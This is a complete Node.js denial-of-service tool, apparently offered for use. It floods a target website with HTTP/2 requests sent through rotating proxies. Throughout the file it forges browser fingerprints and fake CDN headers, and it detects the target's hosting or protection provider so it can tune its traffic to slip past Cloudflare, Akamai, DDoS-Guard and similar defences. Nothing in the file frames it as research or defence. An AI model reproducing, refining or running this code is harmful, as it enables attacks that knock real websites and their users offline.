 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const os = require("os");
 const HPACK = require('hpack');
 const dns = require('dns');
 const util = require('util');
 let hpack = new HPACK();
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
if (process.argv.length < 7){
console.log(`
usage: node bypass target time rate thread proxyfile
example: node bypass https://example.com 120 20 3 http.txt
`);
process.exit();
}
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 };
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
	defaultCiphers[2],
	defaultCiphers[1],
	defaultCiphers[0], 
	...defaultCiphers.slice(3)
].join(":");
const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 const secureProtocol = "TLS_method";
const secureContextOptions = {
	ciphers: ciphers,
	sigalgs: SignalsList,
	honorCipherOrder: true,
	secureOptions: secureOptions,
	secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
if (cluster.isMaster) {
	console.clear()
	console.log('p')
	console.log(`--------------------------------------------`)
	console.log(`Target: ` + process.argv[2])
	console.log(`Time: ` + process.argv[3])
	console.log(`Rate: ` + process.argv[4])
	console.log(`Thread: ` + process.argv[5])
	console.log(`ProxyFile: ` + process.argv[6])
	console.log(`--------------------------------------------`)
	console.log('t.me/bexnxx')
	const restartScript = () => {
		for (const id in cluster.workers) {
			cluster.workers[id].kill();
		}
		console.log('[>] Restarting script...');
		setTimeout(() => {
			for (let counter = 1; counter <= args.threads; counter++) {
				cluster.fork();
			}
		}, 1000);
	};
	const handleRAMUsage = () => {
		const totalRAM = os.totalmem();
		const usedRAM = totalRAM - os.freemem();
		const ramPercentage = (usedRAM / totalRAM) * 100;
		if (ramPercentage >= 50) {
			console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
			restartScript();
		}
	};
	setInterval(handleRAMUsage, 5000);
	for (let counter = 1; counter <= args.threads; counter++) {
		cluster.fork();
	}
  setTimeout(() => {
    process.exit(1);
  }, args.time * 1000);
  
} else {setInterval(bexFlooder) }
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
function randomIntn(min, max) {
       return Math.floor(Math.random() * (max - min) + min);
     }
         
function randomElement(elements) {
      return elements[randomIntn(0, elements.length)];
    }
 function generateRandomString(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
		const randomStringArray = Array.from({
			length
		}, () => {
			const randomIndex = Math.floor(Math.random() * characters.length);
			return characters[randomIndex];
		});
		return randomStringArray.join('');
	}
function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
function createPukimakHeaders() {
  const object = {};
  if (Math.random() < 0.5) {
    object['client-x-with-' + generateRandomString(1, 9)] = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
  }
  if (Math.random() < 0.5) {
    object['cf-sec-with-from-' + generateRandomString(1, 9)] = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
  }
  if (Math.random() < 0.5) {
  object['nodejs-c-python-'+ generateRandomString(1,9)] = generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12);
  }
  if (Math.random() < 0.5) {
    object['user-x-with-' + generateRandomString(1, 9)] = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
  }
  if (Math.random() < 0.5) {
    object['nodejs-c-python-' + generateRandomString(1, 9)] = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
  }
  if (Math.random() < 0.5) {
    const maxIterations = getRandomNumber(1, 2);
    for (let i = 1; i <= maxIterations; i++) {
      const key = 'cf-' + (Math.random() < 0.5 ? 'x' : 'sec') + '-' + generateRandomString(1, 9);
      const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
      object[key] = value;
    }
  }
  return object;
}
function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
 }
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
function shuffleObject(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffledObj = {};
    keys.forEach(key => shuffledObj[key] = obj[key]);
    return shuffledObj;
}
 const parsedTarget = url.parse(args.target);
const cplist = ["TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_AES_128_CCM_8_SHA256"];
const nelxnxx = JSON.stringify({
    "success_fraction": 0,
    "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
    "max-age": Math.random() < 0.5 ? 604800 : 2561000,
    "include_subdomains": Math.random() < 0.5 ? true : false,
   });
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
class bexcoxnxx {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
     connection.setNoDelay(true)
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
let isp;
const lookupPromise = util.promisify(dns.lookup);
async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}
getIPAndISP(parsedTarget.host);
const refers = [ parsedTarget.host, 'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com' ];
const Socker = new bexcoxnxx();
 function bexFlooder() {
     let proxies = readLines(args.proxyFile);
     let proxyAddr = randomElement(proxies);
     var parsedProxy = proxyAddr.split(":");
     var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 10,
     };
const browsers = ["chrome", "safari", "brave", "firefox", "android", "opera", "operagx"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 12, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        android: { min: 115, max: 124 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 }
    };
    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const headersMap = {
        brave: {
            "sec-ch-ua": `Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Brave/1.8.95`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"brave";v="${version}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
        },
        chrome: {
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"chrome";v="${version}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
        },
        firefox: {
            "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
            "sec-ch-ua-mobile": "?0",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"firefox";v="${version}.0", "Not A;Brand";v="99.0.0.0"`,
        },
        safari: {
            "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"safari";v="${version}.0", "Not A;Brand";v="99.0.0.0"`,
        },
        android: {
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"chrome";v="${version}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
        },
        opera: {
            "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0.0.0`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"opera";v="${version}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
        },
        operagx: {
            "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "accept": Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
            "Pragma": "no-cache",
            "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPRGX/${version}.0.0.0 OPR/${version}.0.0.0`,
            "sec-fetch-user":  Math.random() <0.75 ?"?1;?1":"?1",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "accept-language": Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
            "Sec-CH-UA-Full-Version-List": `"operagx";v="${version}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
        }
    };
    return headersMap[browser];
};
const browser = getRandomBrowser();
const headersxnxx = generateHeaders(browser);
const bexHeaders1 = [
  { "Refresh": "5" },
  { "cf-mitigated": "challenge" },
  { "origin-agent-cluster": "?1" },
  { 'Nel': nelxnxx },
  { "dnt": "1" },
  { "Accept-Range": 'bytes' },
  { "A-IM": "Feed" },
]
const bexHeaders2 = [
  { "Max-Forwards": Math.random() < 0.5 ? '5' : '10' },
  { "Service-Worker-Navigation-Preload": 'true' },
  { "Supports-Loading-Mode": "credentialed-prerender" },
  { 'viewport-height': '1080' },
  { "From": randstr(5) + '@gmail.com' },
  { "TK": "?" },
]
const bexHeaders3 = [
  { "Expect": "100-continue" },
  { "cluster-ip": randstr(5) },
  { "accept-char": "UTF-8" },
  { "CF-Visitor": `{"scheme":"https"}` },
  { "TTL-3": "1.5" },
  { "data-return": "false" },
]
const bexHeaders4 = [
  { "Observe-Browsing-Topics": "?1" },
  { "Width": "1920" },
  { 'device-memory': '0.25' },
  { "Delta-Base": '12340001' },
  { "Vary": randstr(5) },
  { "Alt-Svc": `"h3=":443"; ma=86400` },
];
const bexHeaders5 = [
  { "akamai-origin-hop": randstr(5) },
  { "source-ip": randstr(5) },
  { "via": '1.1 ' + parsedTarget.host },
  { 'x-forwarded-protocol': "https" },
  { "downlink": Math.floor(Math.random() * 10) + 1 },
  { 'priority': Math.random() < 0.5 ? 'u=0, i' : 'u=3,i=?0' },
  { "purpose": "prefetch" },
];
let bexHeaders = {
"referer": Math.random() < 0.5 ? Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref : Math.random() < 0.5 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
"origin": "https://" + Ref,
...(Math.random() < 0.5 ?{"x-build-id" : randstr(5)} : {['x-content-type-options']: 'nosniff'}),
...(Math.random() < 0.5 ?{"if-modified-since": getRandomDate().toUTCString()} :{}),
...(Math.random() < 0.75 ?{"upgrade-insecure-requests": "1"} : {}),
...(Math.random() < 0.5 ? bexHeaders1[Math.floor(Math.random() * bexHeaders1.length)] : {}),
...(Math.random() < 0.5 ? bexHeaders2[Math.floor(Math.random() * bexHeaders2.length)] : {}),
...(Math.random() < 0.5 ? bexHeaders3[Math.floor(Math.random() * bexHeaders3.length)] : {}),
...(Math.random() < 0.5 ? bexHeaders4[Math.floor(Math.random() * bexHeaders4.length)] : {}),
...(Math.random() < 0.5 ? bexHeaders5[Math.floor(Math.random() * bexHeaders5.length)] : {}),
...createPukimakHeaders(),
...(Math.random() < 0.75 ? {"Cache-Control": "max-age=0"} :{}),
};
let headersmemek = {
":method": "GET",
":scheme": "https",
":authority": parsedTarget.host,
":path": parsedTarget.path + '?' + generateRandomString(5, 10) + '=' + generateRandomString(10, 15),
...shuffleObject(headersxnxx),
...shuffleObject(bexHeaders),
}
function getSettingsBasedOnISP(isp) {
    const settings = {
        headerTableSize: 65536,
        initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
        maxHeaderListSize: 262144,
        enablePush: false,
        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
        maxFrameSize: 16384,
        enableConnectProtocol: false,
    };
    if (isp === 'Cloudflare, Inc.') {
        settings.priority = 1;
        settings.headerTableSize = 65536;
        settings.maxConcurrentStreams = 1000;
        settings.initialWindowSize = 6291456;
        settings.maxFrameSize = 16384;
        settings.enableConnectProtocol = false;
    } else if (isp === 'FDCservers.net' || isp === 'OVH SAS' || isp === 'VNXCLOUD') {
        settings.priority = 0;
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 65536;
        settings.maxFrameSize = 16777215;
        settings.maxConcurrentStreams = 128;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Akamai Technologies, Inc.' || isp === 'Akamai International B.V.') {
        settings.priority = 1;
        settings.headerTableSize = 65536;
        settings.maxConcurrentStreams = 1000;
        settings.initialWindowSize = 6291456;
        settings.maxFrameSize = 16384;
        settings.maxHeaderListSize = 32768;
    } else if (isp === 'Fastly, Inc.' || isp === 'Optitrust GmbH') {
        settings.priority = 0;
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 65535;
        settings.maxFrameSize = 16384;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Ddos-guard LTD') {
        settings.priority = 1;
        settings.maxConcurrentStreams = 1;
        settings.initialWindowSize = 65535;
        settings.maxFrameSize = 16777215;
        settings.maxHeaderListSize = 262144;
    } else if (isp === 'Amazon.com, Inc.' || isp === 'Amazon Technologies Inc.') {
        settings.priority = 0;
        settings.maxConcurrentStreams = 100;
        settings.initialWindowSize = 65535;
        settings.maxHeaderListSize = 262144;
    } else if (isp === 'Microsoft Corporation' || isp === 'Vietnam Posts and Telecommunications Group' || isp === 'VIETNIX') {
        settings.priority = 0;
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 8388608;
        settings.maxFrameSize = 16384;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Google LLC') {
        settings.priority = 0;
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 1048576;
        settings.maxFrameSize = 16384;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 137216;
    } else {
        settings.headerTableSize = 65535;
        settings.maxConcurrentStreams = 1000;
        settings.initialWindowSize = 6291456;
        settings.maxHeaderListSize = 261144;
        settings.maxFrameSize = 16384;
    }
    return settings;
}
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true);
         const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureProtocol: Math.random() < 0.5 ? 'TLSv1_3_method' : 'TLSv1_2_method',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };
        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);
		tlsBex.allowHalfOpen = true;
		tlsBex.setNoDelay(true);
		tlsBex.setKeepAlive(true, 60000);
		tlsBex.setMaxListeners(0);
		const bexClient = http2.connect(parsedTarget.href, {
		    protocol: "https:",
	    	createConnection: () => tlsBex,
			settings: getSettingsBasedOnISP(isp),
			socket: tlsBex,
	    	});
         bexClient.setMaxListeners(0);
         bexClient.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
         bexClient.on('session', (session) => {
          session.setLocalWindowSize(15663105);
         }); 
bexClient.on('connect', async () => {
	const intervalId = setInterval(async () => {
		const packed = Buffer.concat([
			Buffer.from([0x80, 0, 0, 0, 0xFF]),
			hpack.encode(headersmemek)
		]);
		const streamId = 1;
		const requests = [];
		let count = 0;
		if (tlsBex && !tlsBex.destroyed && tlsBex.writable) {
			for (let i = 0; i < args.Rate; i++) {
				const requestPromise = new Promise((resolve, reject) => {
				const bex = bexClient.request(headersmemek, {
                      weight: Math.random() < 0.5 ? 255 : 220,
                      depends_on: 0,
                      exclusive: Math.random() < 0.5 ? true : false,
                      })
                .on('response', response => {
						bex.close();
						bex.destroy();
						resolve();
					});
					bex.on('end', () => {
						count++;
						if (count === args.time * args.Rate) {
							clearInterval(intervalId);
							bexClient.close(http2.constants.NGHTTP2_CANCEL);
						}
						reject(new Error('Request timed out'));
					});
					bex.end();
				});
				const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
				requests.push({ requestPromise, frame });
			}
			await Promise.all(requests.map(({ requestPromise }) => requestPromise));
		}
	}, 1000);
});
          bexClient.on("close", () => {
            bexClient.destroy();
            tlsBex.destroy();
            connection.destroy();
            return
        });

        bexClient.on("error", error => {
            bexClient.destroy();
            connection.destroy();
            return
        });
     });
 }
 setTimeout(() => process.exit(1), args.time * 1000);
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
